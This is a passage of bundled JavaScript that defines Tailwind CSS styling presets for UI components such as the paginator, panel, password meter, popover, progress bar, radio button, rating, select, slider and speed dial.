      "[&>[data-pc-name=pcbadge]]:top-0",
      "[&>[data-pc-name=pcbadge]]:right-0",
      "[&>[data-pc-name=pcbadge]]:translate-x-1/2",
      "[&>[data-pc-name=pcbadge]]:-translate-y-1/2",
      "[&>[data-pc-name=pcbadge]]:m-0",
      "[&>[data-pc-name=pcbadge]]:origin-[100%_0]",
      "[&>[data-pc-name=pcbadge]]:outline",
      "[&>[data-pc-name=pcbadge]]:outline-[2px]",
      "[&>[data-pc-name=pcbadge]]:outline-surface-0",
      "dark:[&>[data-pc-name=pcbadge]]:outline-surface-900"
    ]
  }
}, Yu = {
  root: {
    class: [
      // Flex & Alignment
      "flex items-center justify-center flex-wrap",
      // Spacing
      "px-4 py-2",
      // Shape
      "border-0 rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-500 dark:text-white/60"
    ]
  },
  first: ({ context: e }) => ({
    class: [
      "relative",
      // Flex & Alignment
      "inline-flex items-center justify-center",
      // Shape
      "border-0 rounded-full",
      // Size
      "min-w-[2.5rem] h-10 m-[0.143rem]",
      "leading-none",
      // Color
      "text-surface-500 dark:text-white/60",
      // State
      {
        "hover:bg-surface-50 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.disabled,
        "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400": !e.disabled
      },
      // Transition
      "transition duration-200",
      // Misc
      "user-none overflow-hidden",
      { "cursor-default pointer-events-none opacity-60": e.disabled }
    ]
  }),
  prev: ({ context: e }) => ({
    class: [
      "relative",
      // Flex & Alignment
      "inline-flex items-center justify-center",
      // Shape
      "border-0 rounded-full",
      // Size
      "min-w-[2.5rem] h-10 m-[0.143rem]",
      "leading-none",
      // Color
      "text-surface-500 dark:text-white/60",
      // State
      {
        "hover:bg-surface-50 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.disabled,
        "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400": !e.disabled
      },
      // Transition
      "transition duration-200",
      // Misc
      "user-none overflow-hidden",
      { "cursor-default pointer-events-none opacity-60": e.disabled }
    ]
  }),
  next: ({ context: e }) => ({
    class: [
      "relative",
      // Flex & Alignment
      "inline-flex items-center justify-center",
      // Shape
      "border-0 rounded-full",
      // Size
      "min-w-[2.5rem] h-10 m-[0.143rem]",
      "leading-none",
      // Color
      "text-surface-500 dark:text-white/60",
      // State
      {
        "hover:bg-surface-50 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.disabled,
        "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400": !e.disabled
      },
      // Transition
      "transition duration-200",
      // Misc
      "user-none overflow-hidden",
      { "cursor-default pointer-events-none opacity-60": e.disabled }
    ]
  }),
  last: ({ context: e }) => ({
    class: [
      "relative",
      // Flex & Alignment
      "inline-flex items-center justify-center",
      // Shape
      "border-0 rounded-full",
      // Size
      "min-w-[2.5rem] h-10 m-[0.143rem]",
      "leading-none",
      // Color
      "text-surface-500 dark:text-white/60",
      // State
      {
        "hover:bg-surface-50 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.disabled,
        "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400": !e.disabled
      },
      // Transition
      "transition duration-200",
      // Misc
      "user-none overflow-hidden",
      { "cursor-default pointer-events-none opacity-60": e.disabled }
    ]
  }),
  page: ({ context: e }) => ({
    class: [
      "relative",
      // Flex & Alignment
      "inline-flex items-center justify-center",
      // Shape
      "border-0 rounded-full",
      // Size
      "min-w-[2.5rem] h-10 m-[0.143rem]",
      "leading-none",
      // Color
      {
        "bg-highlight text-highlight-contrast border-highlight text-highlight-contrast hover:bg-highlight-emphasis ": e.active,
        "text-surface-500 dark:text-white/60": !e.active
      },
      // State
      {
        "hover:bg-surface-50 dark:hover:bg-[rgba(255,255,255,0.03)]": !e.disabled && !e.active,
        "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-primary-500 dark:focus:ring-primary-400": !e.disabled
      },
      // Transition
      "transition duration-200",
      // Misc
      "user-none overflow-hidden",
      { "cursor-default pointer-events-none opacity-60": e.disabled }
    ]
  }),
  contentStart: "mr-auto",
  contentEnd: "ml-auto"
}, Xu = {
  root: {
    class: [
      //Shape
      "rounded-md",
      //Colors
      "border border-surface-200 dark:border-surface-700",
      "bg-surface-0 dark:bg-surface-900"
    ]
  },
  header: ({ props: e }) => ({
    class: [
      // Flex
      "flex items-center justify-between",
      // Colors
      "text-surface-700 dark:text-surface-0/80",
      "bg-transparent",
      //Shape
      "rounded-tl-md rounded-tr-md",
      "border-0",
      // Conditional Spacing
      {
        "p-[1.125rem]": !e.toggleable,
        "py-3 px-[1.125rem]": e.toggleable
      }
    ]
  }),
  title: {
    class: "leading-none font-semibold"
  },
  pctogglebutton: {
    root: {
      class: [
        // Positioning
        "relative",
        // Flexbox alignment
        "inline-flex items-center justify-center text-center",
        // Line height
        "leading-[normal]",
        // Size
        "w-10 h-10 px-0 py-2",
        // Shape
        "rounded-[50%] rounded-full",
        // Background and border
        "bg-transparent border-transparent",
        // Text color
        "text-surface-500 dark:text-surface-300",
        // Focus states
        "focus:outline-none focus:outline-offset-0 focus:ring-1 focus:ring-surface-500 dark:focus:ring-surface-400",
        // Hover effect
        "hover:bg-surface-300/10",
        // Transition effects
        "transition duration-200 ease-in-out",
        // Cursor and overflow
        "cursor-pointer overflow-hidden select-none"
      ]
    }
  },
  content: {
    class: [
      // Spacing
      "p-[1.125rem] pt-0",
      // Shape
      "border-0 border-t-0 last:rounded-br-md last:rounded-bl-md",
      //Color
      "text-surface-700 dark:text-surface-0/80"
    ]
  },
  footer: {
    class: [
      // Spacing
      "p-[1.125rem] pt-0",
      // Shape
      "border-0 border-t-0 rounded-br-lg rounded-bl-lg",
      //Color
      "text-surface-700 dark:text-surface-0/80"
    ]
  },
  transition: {
    enterFromClass: "max-h-0",
    enterActiveClass: "overflow-hidden transition-[max-height] duration-1000 ease-[cubic-bezier(0.42,0,0.58,1)]",
    enterToClass: "max-h-[1000px]",
    leaveFromClass: "max-h-[1000px]",
    leaveActiveClass: "overflow-hidden transition-[max-height] duration-[450ms] ease-[cubic-bezier(0,1,0,1)]",
    leaveToClass: "max-h-0"
  }
}, Qu = {
  root: {
    class: "bg-surface-800 rounded-md"
  },
  panel: {
    class: "p-1 overflow-hidden rounded-md bg-surface-800"
  },
  header: {
    class: ["rounded-[4px]", "outline-none"]
  },
  headerContent: ({ context: e }) => ({
    class: [
      // Shape
      "rounded-[4px]",
      // Color
      "text-surface-600 dark:text-surface-0/80",
      { "text-surface-900": e.active },
      // States
      "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.20)]",
      // Transition
      "transition duration-200 ease-in-out",
      "transition-shadow duration-200"
    ]
  }),
  headerLink: {
    class: [
      "relative",
      // Font
      "font-semibold",
      "leading-none",
      // Flex & Alignments
      "flex items-center",
      // Spacing
      "py-2 px-3",
      // Misc
      "select-none cursor-pointer no-underline"
    ]
  },
  headerLabel: {
    class: "leading-none"
  },
  headerIcon: {
    class: "mr-2"
  },
  submenuIcon: {
    class: "mr-2 w-3 h-3"
  },
  content: {
    class: [
      // Color
      "text-surface-700 dark:text-white/80"
    ]
  },
  rootList: {
    class: ["outline-none", "m-0 p-0 list-none"]
  },
  menuitem: {
    class: "relative my-[2px]"
  },
  itemContent: {
    class: [
      // Shape
      "border-none rounded-[4px]",
      // Color
      "text-surface-700 dark:text-white/80",
      // Transition
      "transition-shadow duration-200"
    ]
  },
  itemLink: ({ context: e }) => ({
    class: [
      "relative",
      // Font
      "leading-none",
      // Flex & Alignments
      "flex items-center",
      // Spacing
      "py-2 px-3",
      // Shape
      "rounded-[4px]",
      // Color
      "text-surface-300",
      // States
      "hover:bg-surface-100 dark:hover:bg-[rgba(255,255,255,0.20)] hover:text-surface-700 dark:hover:text-white/80",
      {
        "bg-surface-200 text-surface-700 dark:text-white/80 dark:bg-surface-0/10": e.focused
      },
      // Misc
      "cursor-pointer no-underline",
      "select-none overflow-hidden"
    ]
  }),
  itemIcon: {
    class: "mr-2"
  },
  submenu: {
    class: "p-0 m-0 list-none"
  },
  transition: {
    enterFromClass: "max-h-0",
    enterActiveClass: "overflow-hidden transition-[max-height] duration-1000 ease-[cubic-bezier(0.42,0,0.58,1)]",
    enterToClass: "max-h-[1000px]",
    leaveFromClass: "max-h-[1000px]",
    leaveActiveClass: "overflow-hidden transition-[max-height] duration-[450ms] ease-[cubic-bezier(0,1,0,1)]",
    leaveToClass: "max-h-0"
  }
}, Zu = {
  root: ({ props: e }) => ({
    class: [
      "relative [&>input]:w-full",
      { "[&>input]:pr-10": e.toggleMask },
      { "flex [&>input]:w-full": e.fluid, "inline-flex": !e.fluid }
    ]
  }),
  overlay: {
    class: [
      // Spacing
      "p-3",
      // Shape
      "border",
      "shadow-md rounded-md",
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      "border-surface-200 dark:border-surface-700"
    ]
  },
  meter: {
    class: [
      // Position and Overflow
      "overflow-hidden",
      "relative",
      // Shape and Size
      "border-0",
      "h-[10px]",
      "rounded-md",
      // Spacing
      "mb-3",
      // Colors
      "bg-surface-100 dark:bg-surface-700"
    ]
  },
  meterLabel: ({ instance: e }) => {
    var t, r, o;
    return {
      class: [
        // Size
        "h-full",
        // Colors
        {
          "bg-red-500 dark:bg-red-400/50": ((t = e == null ? void 0 : e.meter) == null ? void 0 : t.strength) == "weak",
          "bg-orange-500 dark:bg-orange-400/50": ((r = e == null ? void 0 : e.meter) == null ? void 0 : r.strength) == "medium",
          "bg-green-500 dark:bg-green-400/50": ((o = e == null ? void 0 : e.meter) == null ? void 0 : o.strength) == "strong"
        },
        // Transitions
        "transition-all duration-1000 ease-in-out"
      ]
    };
  },
  maskIcon: {
    class: [
      "absolute top-1/2 right-3 -mt-2 z-10",
      "text-surface-600 dark:text-white/70"
    ]
  },
  unmaskIcon: {
    class: [
      "absolute top-1/2 right-3 -mt-2 z-10",
      "text-surface-600 dark:text-white/70"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, ed = {
  root: "flex [&_[data-pc-name=pclist]]:h-full",
  sourceControls: {
    class: [
      // Flexbox & Alignment
      "flex xl:flex-col justify-center gap-2",
      // Spacing
      "p-[1.125rem]"
    ]
  },
  sourceListContainer: {
    class: [
      // Flexbox
      "grow shrink basis-2/4",
      // Shape
      "rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "border border-surface-200 dark:border-surface-700",
      "outline-none"
    ]
  },
  transferControls: {
    class: [
      // Flexbox & Alignment
      "flex xl:flex-col justify-center gap-2",
      // Spacing
      "p-[1.125rem]"
    ]
  },
  targetListContainer: {
    class: [
      // Flexbox
      "grow shrink basis-2/4",
      // Shape
      "rounded-md",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "border border-surface-200 dark:border-surface-700",
      "outline-none"
    ]
  },
  targetControls: {
    class: [
      // Flexbox & Alignment
      "flex xl:flex-col justify-center gap-2",
      // Spacing
      "p-[1.125rem]"
    ]
  },
  transition: {
    enterFromClass: "!transition-none",
    enterActiveClass: "!transition-none",
    leaveActiveClass: "!transition-none",
    leaveToClass: "!transition-none"
  }
}, Xs = {
  root: {
    class: [
      // Shape
      "rounded-md shadow-lg",
      // Position
      "absolute left-0 top-0 mt-3",
      '[&[data-p-popover-flipped="true"]]:mb-3 [&[data-p-popover-flipped="true"]]:-mt-3',
      "z-40 transform origin-center",
      // Color
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-surface-0/80",
      // Before: Arrow
      "before:absolute before:w-0 before:-top-3 before:h-0 before:border-transparent before:border-solid before:ml-[10px] before:border-x-[10px] before:border-b-[10px] before:border-t-0 before:border-b-surface-200 dark:before:border-b-surface-700",
      "after:absolute after:w-0 after:-top-[0.54rem] after:left-[4px] after:h-0 after:border-transparent after:border-solid after:ml-[8px] after:border-x-[8px] after:border-b-[8px] after:border-t-0 after:border-b-surface-0 dark:after:border-b-surface-900",
      // Flipped: Arrow
      '[&[data-p-popover-flipped="true"]]:before:-bottom-3 [&[data-p-popover-flipped="true"]]:before:top-auto [&[data-p-popover-flipped="true"]]:before:border-b-0 [&[data-p-popover-flipped="true"]]:before:border-t-[10px] [&[data-p-popover-flipped="true"]]:before:border-t-surface-200 dark:[&[data-p-popover-flipped="true"]]:before:border-t-surface-700',
      '[&[data-p-popover-flipped="true"]]:after:-bottom-[0.54rem] [&[data-p-popover-flipped="true"]]:after:top-auto [&[data-p-popover-flipped="true"]]:after:border-b-0 [&[data-p-popover-flipped="true"]]:after:border-t-[8px] [&[data-p-popover-flipped="true"]]:after:border-t-surface-0 dark:[&[data-p-popover-flipped="true"]]:after:border-t-surface-900',
      '[&[data-arrow-right="true"]]:before:!right-5 [&[data-arrow-right="true"]]:after:!right-[1.35rem] [&[data-arrow-right="true"]]:after:!left-auto'
    ]
  },
  content: {
    class: [
      "p-5 items-center flex",
      "rounded-lg",
      "border border-surface-200 dark:border-surface-700"
    ]
  },
  transition: {
    enterFromClass: "opacity-0 scale-y-[0.8]",
    enterActiveClass: "transition-[transform,opacity] duration-[120ms] ease-[cubic-bezier(0,0,0.2,1)]",
    leaveActiveClass: "transition-opacity duration-100 ease-linear",
    leaveToClass: "opacity-0"
  }
}, td = {
  root: {
    class: [
      // Position and Overflow
      "overflow-hidden",
      "relative",
      // Shape and Size
      "border-0",
      "h-5",
      "rounded-md",
      // Colors
      "bg-surface-100 dark:bg-surface-800"
    ]
  },
  value: ({ props: e }) => ({
    class: [
      // Flexbox & Overflow & Position
      {
        "absolute flex items-center justify-center overflow-hidden": e.mode !== "indeterminate"
      },
      // Colors
      "bg-primary",
      // Spacing & Sizing
      "m-0",
      { "h-full w-0": e.mode !== "indeterminate" },
      // Shape
      "border-0",
      // Transitions
      {
        "transition-width duration-1000 ease-in-out": e.mode !== "indeterminate",
        "progressbar-value-animate": e.mode == "indeterminate"
      },
      // Before & After (indeterminate)
      {
        "before:absolute before:top-0 before:left-0 before:bottom-0 before:bg-inherit ": e.mode == "indeterminate",
        "after:absolute after:top-0 after:left-0 after:bottom-0 after:bg-inherit after:delay-1000": e.mode == "indeterminate"
      }
    ]
  }),
  label: {
    class: [
      //Font
      "text-xs font-semibold",
      // Flexbox
      "inline-flex",
      // Font and Text
      "text-white dark:text-surface-900",
      "leading-5"
    ]
  }
}, rd = {
  root: {
    class: [
      // Position
      "relative",
      "mx-auto",
      // Sizing
      "w-28",
      "h-28",
      // Flexbox
      "inline-block",
      // Pseudo-Elements
      "before:block",
      "before:pt-full"
    ]
  },
  spinner: {
    class: [
      // Position
      "absolute",
      "top-0",
      "bottom-0",
      "left-0",
      "right-0",
      "m-auto",
      // Sizing
      "w-full",
      "h-full",
      // Transformations
      "transform",
      "origin-center",
      // Animations
      "animate-spin"
    ]
  },
  circle: {
    class: [
      // Colors
      "text-red-500",
      // Misc
      "progress-spinner-circle"
    ]
  }
}, od = {
  root: {
    class: [
      "relative",
      // Flexbox & Alignment
      "inline-flex",
      "align-bottom",
      // Size
      "w-5 h-5",
      // Misc
      "cursor-pointer",
      "select-none"
    ]
  },
  box: ({ props: e, context: t }) => ({
    class: [
      // Flexbox
      "flex justify-center items-center",
      // Size
      "w-5 h-5",
      // Shape
      "border outline-transparent",
      "rounded-full",
      // Transition
      "transition duration-200 ease-in-out",
      // Colors
      {
        "text-surface-700 dark:text-white/80": t.checked,
        "border-surface-300 dark:border-surface-700": !t.checked && !e.invalid,
        "border-primary bg-primary": t.checked && !e.disabled
      },
      // Invalid State
      { "border-red-500 dark:border-red-400": e.invalid },
      // States
      {
        "peer-hover:border-surface-400 dark:peer-hover:border-surface-400": !e.disabled && !e.invalid && !t.checked,
        "peer-hover:border-primary-emphasis": !e.disabled && !t.checked,
        "peer-hover:[&>*:first-child]:bg-primary-600 dark:peer-hover:[&>*:first-child]:bg-primary-300": !e.disabled && !t.checked,
        "peer-focus-visible:ring-1 peer-focus-visible:ring-primary-500 dark:peer-focus-visible:ring-primary-400": !e.disabled,
        "bg-surface-200 [&>*:first-child]:bg-surface-600 dark:bg-surface-700 dark:[&>*:first-child]:bg-surface-400 border-surface-300 dark:border-surface-700 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  input: {
    class: [
      "peer",
      // Size
      "w-full ",
      "h-full",
      // Position
      "absolute",
      "top-0 left-0",
      "z-10",
      // Spacing
      "p-0",
      "m-0",
      // Shape
      "opacity-0",
      "rounded-md",
      "outline-none",
      "border-1 border-surface-200 dark:border-surface-700",
      // Misc
      "appearance-none",
      "cursor-pointer"
    ]
  },
  icon: ({ context: e }) => ({
    class: [
      "block",
      // Shape
      "rounded-full",
      // Size
      "w-3 h-3",
      // Conditions
      {
        "bg-surface-0 dark:bg-surface-900": e.checked,
        "bg-primary": !e.checked,
        "backface-hidden invisible scale-[0.1]": !e.checked,
        "transform visible translate-z-0 scale-[1,1]": e.checked
      },
      // Transition
      "transition duration-200"
    ]
  })
}, sd = {
  root: ({ props: e }) => ({
    class: [
      "relative",
      // Flex & Alignment
      "flex items-center",
      "gap-1",
      // Misc
      {
        "opacity-60 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  option: ({ props: e, context: t }) => ({
    class: [
      // Flex & Alignment
      "inline-flex items-center",
      // State
      {
        "outline-none ring-1 ring-primary-500/50 dark:ring-primary-500": t.focused
      },
      // Misc
      {
        "cursor-pointer": !e.readonly,
        "cursor-default": e.readonly
      }
    ]
  }),
  offIcon: ({ props: e }) => ({
    class: [
      // Size
      "w-4 h-4",
      // Color
      "text-surface-700 dark:text-surface-0/80",
      // State
      { "hover:text-primary-500 dark:hover:text-primary-400": !e.readonly },
      // Transition
      "transition duration-200 ease-in"
    ]
  }),
  onIcon: ({ props: e }) => ({
    class: [
      // Size
      "w-4 h-4",
      // Color
      "text-primary",
      // State
      { "hover:text-primary-600 dark:hover:text-primary-300": !e.readonly },
      // Transition
      "transition duration-200 ease-in"
    ]
  })
}, nd = {
  root: {
    class: [
      "block absolute bg-surface-200 dark:bg-surface-700 rounded-full pointer-events-none"
    ],
    style: "transform: scale(0)"
  }
}, ad = {
  root: {
    class: ["group"]
  },
  contentContainer: {
    class: [
      // Size & Position
      "h-full w-full",
      // Layering
      "z-[1]",
      // Spacing
      "overflow-hidden",
      // Misc
      "relative float-left"
    ]
  },
  content: {
    class: [
      // Size & Spacing
      "h-[calc(100%+18px)] w-[calc(100%+18px)] pr-[18px] pb-[18px] pl-0 pt-0",
      // Overflow & Scrollbar
      "overflow-scroll scrollbar-none",
      // Box Model
      "box-border",
      // Position
      "relative",
      // Webkit Specific
      "[&::-webkit-scrollbar]:hidden"
    ]
  },
  barX: {
    class: [
      // Size & Position
      "h-[9px] bottom-0",
      // Appearance
      "bg-surface-100 dark:bg-surface-800 rounded",
      "opacity-0",
      // Interactivity
      "cursor-pointer",
      "focus:outline-none",
      // Visibility & Layering
      "invisible z-20",
      // Transition
      "transition duration-[250ms] ease-linear",
      // Misc
      "relative",
      "group-hover:opacity-100"
    ]
  },
  barY: {
    class: [
      // Size & Position
      "w-[9px] top-0",
      // Appearance
      "bg-surface-100 dark:bg-surface-800 rounded",
      "opacity-0",
      // Interactivity
      "cursor-pointer",
      "focus:outline-none",
      // Visibility & Layering
      "z-20",
      // Transition
      "transition duration-[250ms] ease-linear",
      // Misc
      "relative",
      "group-hover:opacity-100"
    ]
  }
}, id = {
  button: ({ props: e }) => ({
    root: {
      class: [
        // Flex & Alignment
        "flex items-center justify-center",
        // Positioning
        {
          "!sticky flex ml-auto": e.target === "parent",
          "!fixed": e.target === "window"
        },
        "bottom-[20px] right-[20px]",
        "h-10 w-10 rounded-full shadow-md",
        "text-white dark:text-surface-900 bg-surface-600 dark:bg-surface-700",
        "hover:bg-surface-600 dark:hover:bg-surface-300"
      ]
    }
  }),
  transition: {
    enterFromClass: "opacity-0",
    enterActiveClass: "transition-opacity duration-150",
    leaveActiveClass: "transition-opacity duration-150",
    leaveToClass: "opacity-0"
  }
}, Qs = {
  root: ({ props: e, state: t, parent: r }) => ({
    class: [
      // Display and Position
      "inline-flex",
      "relative",
      // Shape
      { "rounded-md": r.instance.$name !== "InputGroup" },
      {
        "first:rounded-l-md rounded-none last:rounded-r-md": r.instance.$name == "InputGroup"
      },
      {
        "border-0 border-y border-l last:border-r": r.instance.$name == "InputGroup"
      },
      {
        "first:ml-0 ml-[-1px]": r.instance.$name == "InputGroup" && !e.showButtons
      },
      // Color and Background
      { "bg-surface-0 dark:bg-surface-950": !e.disabled },
      "border",
      { "dark:border-surface-600": r.instance.$name != "InputGroup" },
      { "dark:border-surface-600": r.instance.$name == "InputGroup" },
      { "border-surface-300 dark:border-surface-600": !e.invalid },
      // Invalid State
      "invalid:focus:ring-red-200",
      "invalid:hover:border-red-500",
      { "border-red-500 dark:border-red-400": e.invalid },
      // Transitions
      "transition-all",
      "duration-200",
      // States
      { "hover:border-secondary-400": !e.invalid },
      // Misc
      "cursor-pointer",
      "select-none",
      {
        "bg-surface-200 dark:bg-surface-700 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  label: ({ props: e, parent: t }) => {
    var r;
    return {
      class: [
        //Font
        "leading-[normal]",
        // Display
        "block",
        "flex-auto",
        // Color and Background
        "bg-transparent",
        "border-0",
        {
          "text-surface-800 dark:text-white/80": e.modelValue != null,
          "text-surface-400 dark:text-surface-500": e.modelValue == null
        },
        "placeholder:text-surface-400 dark:placeholder:text-surface-500",
        // Sizing and Spacing
        "w-[1%]",
        "py-2 pl-3",
        { "pr-7": e.showClear },
        //Shape
        "rounded-none",
        // Transitions
        "transition",
        "duration-200",
        // States
        "focus:outline-none focus:shadow-none",
        // Filled State *for FloatLabel
        {
          filled: ((r = t.instance) == null ? void 0 : r.$name) == "FloatLabel" && e.modelValue !== null
        },
        // Misc
        "relative",
        "cursor-pointer",
        "overflow-hidden overflow-ellipsis",
        "whitespace-nowrap",
        "appearance-none"
      ]
    };
  },
  dropdown: {
    class: [
      // Flexbox
      "flex items-center justify-center",
      "shrink-0",
      // Color and Background
      "bg-transparent",
      "text-surface-300",
      // Size
      "pl-1 pr-3",
      // Shape
      "rounded-r-md"
    ]
  },
  overlay: {
    class: [
      // Colors
      "bg-surface-0 dark:bg-surface-900",
      "text-surface-700 dark:text-white/80",
      // Shape
      "border border-surface-300 dark:border-surface-700",
      "rounded-md",
      "shadow-md"
    ]
  },
  listContainer: {
    class: [
      // Sizing
      "max-h-[200px]",
      // Misc
      "overflow-auto"
    ]
  },
  list: {
    class: "m-0 p-1 list-none gap-[2px] flex flex-col"
  },
  option: ({ context: e }) => ({
    class: [
      "relative",
      "flex items-center",
      // Font
      "leading-none",
      // Spacing
      "m-0 px-3 py-2",
      "first:mt-0 mt-[2px]",
      // Shape
      "border-0 rounded",
      // Colors
      {
        "bg-surface-200 dark:bg-surface-600/60": e.focused && !e.selected,
        "text-surface-700 dark:text-white/80": e.focused && !e.selected,
        "bg-highlight": e.selected,
        "bg-highlight-emphasis": e.focused && e.selected
      },
      // Transition
      "transition-colors duration-200",
      // Misc
      "cursor-pointer font-normal overflow-hidden whitespace-nowrap"
    ]
  }),
  optionGroup: {
    class: [
      "font-semibold",
      // Spacing
      "m-0 py-2 px-3",
      // Colors
      "text-surface-400 dark:text-surface-500",
      // Misc
      "cursor-auto"
    ]
  },
  optionCheckIcon: "relative -ms-1.5 me-1.5 text-surface-700 dark:text-white/80 w-4 h-4",
  optionBlankIcon: "w-4 h-4",
  emptyMessage: {
    class: [
      // Font
      "leading-none",
      // Spacing
      "py-2 px-3",
      // Color
      "text-surface-800 dark:text-white/80",
      "bg-transparent"
    ]
  },
  header: {
    class: [
      // Spacing
      "pt-2 px-2 pb-0",
      "m-0",
      //Shape
      "border-b-0",
      "rounded-tl-md",
      "rounded-tr-md",
      // Color
      "text-surface-700 dark:text-white/80",
      "bg-surface-0 dark:bg-surface-900",
      "border-surface-300 dark:border-surface-700",
      // Filter
      "[&_[data-pc-name=pcfilter]]:w-full"
    ]
  },
  clearIcon: {
    class: [
      // Color
      "text-surface-400 dark:text-surface-500",
      // Position
      "absolute",
      "top-1/2",
      "right-12",
      // Spacing
      "-mt-2"
    ]
  },
  loadingIcon: {
    class: "text-surface-400 dark:text-surface-500 animate-spin"
  }
}, ld = {
  root: ({ props: e }) => ({
    class: [
      "inline-flex select-none align-bottom outline-transparent",
      "border rounded-md [&>button]:rounded-none [&>button]:border-none",
      "[&>button:first-child]:border-r-none [&>button:first-child]:rounded-r-none [&>button:first-child]:rounded-tl-md [&>button:first-child]:rounded-bl-md",
      "[&>button:last-child]:border-l-none [&>button:first-child]:rounded-l-none [&>button:last-child]:rounded-tr-md [&>button:last-child]:rounded-br-md",
      // Invalid State
      {
        "border-red-500 dark:border-red-400": e.invalid,
        "border-transparent": !e.invalid
      }
    ]
  })
}, cd = {
  root: ({ props: e }) => ({
    class: [
      "overflow-hidden",
      {
        "animate-pulse": e.animation !== "none"
      },
      // Round
      {
        "rounded-full": e.shape === "circle",
        "rounded-md": e.shape !== "circle"
      },
      // Colors
      "bg-surface-200 dark:bg-surface-700"
    ]
  })
}, ud = {
  root: ({ props: e }) => ({
    class: [
      "relative",
      // Size
      {
        "h-[3px]": e.orientation == "horizontal",
        "w-[3px]": e.orientation == "vertical"
      },
      // Shape
      "border-0",
      "rounded-md",
      // Colors
      "bg-surface-200 dark:bg-surface-800",
      // States
      {
        "opacity-60 select-none pointer-events-none cursor-default": e.disabled
      }
    ]
  }),
  range: ({ props: e }) => ({
    class: [
      // Position
      "block absolute",
      {
        "top-0 left-0": e.orientation == "horizontal",
        "bottom-0 left-0": e.orientation == "vertical"
      },
      //Size
      {
        "h-full": e.orientation == "horizontal",
        "w-full": e.orientation == "vertical"
      },
      // Shape
      "rounded-md",
      // Colors
      "bg-secondary-400"
    ]
  }),
  handle: ({ props: e }) => ({
    class: [
      "flex items-center justify-center",
      // Size
      "h-[20px]",
      "w-[20px]",
      {
        "top-[50%] -mt-[10px] -ml-[10px]": e.orientation == "horizontal",
        "left-[50%] -mb-[10px] -ml-[10px]": e.orientation == "vertical"
      },
      // Shape
      "rounded-full",
      "before:block before:w-[16px] before:h-[16px] before:rounded-full before:bg-surface-0 dark:before:bg-surface-950 before:shadow-md",
      // Colors
      "bg-surface-200 dark:bg-surface-800",
      // States
      "focus-visible:outline-none focus-visible:outline-offset-0 focus-visible:ring-1",
      "ring-secondary-400 dark:ring-secondary-400",
      // Transitions
      "transition duration-200",
      // Misc
      "cursor-grab",
      "touch-action-none"
    ]
  }),
  startHandler: ({ props: e }) => ({
    class: [
      "flex items-center justify-center",
      // Size
      "h-[20px]",
      "w-[20px]",
      {
        "top-[50%] -mt-[10px] -ml-[10px]": e.orientation == "horizontal",
        "left-[50%] -mb-[10px] -ml-[10px]": e.orientation == "vertical"
      },
      // Shape
      "rounded-full",
      "before:block before:w-[16px] before:h-[16px] before:rounded-full before:bg-surface-0 dark:before:bg-surface-950 before:shadow-md",
      // Colors
      "bg-surface-200 dark:bg-surface-800",
      // States
      "focus-visible:outline-none focus-visible:outline-offset-0 focus-visible:ring-1",
      "ring-secondary-400 dark:ring-secondary-400",
      // Transitions
      "transition duration-200",
      // Misc
      "cursor-grab",
      "touch-action-none"
    ]
  }),
  endHandler: ({ props: e }) => ({
    class: [
      "flex items-center justify-center",
      // Size
      "h-[20px]",
      "w-[20px]",
      {
        "top-[50%] -mt-[10px] -ml-[10px]": e.orientation == "horizontal",
        "left-[50%] -mb-[10px] -ml-[10px]": e.orientation == "vertical"
      },
      // Shape
      "rounded-full",
      "before:block before:w-[16px] before:h-[16px] before:rounded-full before:bg-surface-0 dark:before:bg-surface-950 before:shadow-md",
      // Colors
      "bg-surface-200 dark:bg-surface-800",
      // States
      "focus-visible:outline-none focus-visible:outline-offset-0 focus-visible:ring-1",
      "ring-secondary-400 dark:ring-secondary-400",
      // Transitions
      "transition duration-200",
      // Misc
      "cursor-grab",
      "touch-action-none"
    ]
  })
}, dd = {
  root: ({ state: e }) => ({
    class: [
      "static flex gap-2",
      {
        "[&_[data-pc-name=pcbutton]]:rotate-45": e.d_visible,
        "[&_[data-pc-name=pcbutton]]:rotate-0": !e.d_visible
      }
    ]
  }),
  list: {
    class: [
      // Spacing
      "m-0 p-0",
      // Layout & Flexbox
      "list-none flex items-center justify-center",
      // Transitions
      "transition delay-200",
      // Z-Index (Positioning)
      "z-20"
    ]
  },
  item: ({ props: e, context: t }) => ({
    class: [
      "transform transition-transform duration-200 ease-out transition-opacity duration-800",
      // Conditional Appearance
      t.hidden ? "opacity-0 scale-0" : "opacity-100 scale-100",
      // Conditional Spacing
      {
        "my-1 first:mb-2": e.direction == "up" && e.type == "linear",
        "my-1 first:mt-2": e.direction == "down" && e.type == "linear",
        "mx-1 first:mr-2": e.direction == "left" && e.type == "linear",
        "mx-1 first:ml-2": e.direction == "right" && e.type == "linear"
      },
      // Conditional Positioning
      { absolute: e.type !== "linear" }
    ]
  }),
  mask: ({ state: e }) => ({
    class: [
      // Base Styles
      "absolute left-0 top-0 w-full h-full transition-opacity duration-250 ease-in-out bg-black/40 z-0",
      // Conditional Appearance
      {
        "opacity-0 pointer-events-none": !e.d_visible,
        "opacity-100 transition-opacity duration-400 ease-in-out": e.d_visible
      }
    ]
  })
}, fd = {
  root: ({ props: e }) => ({
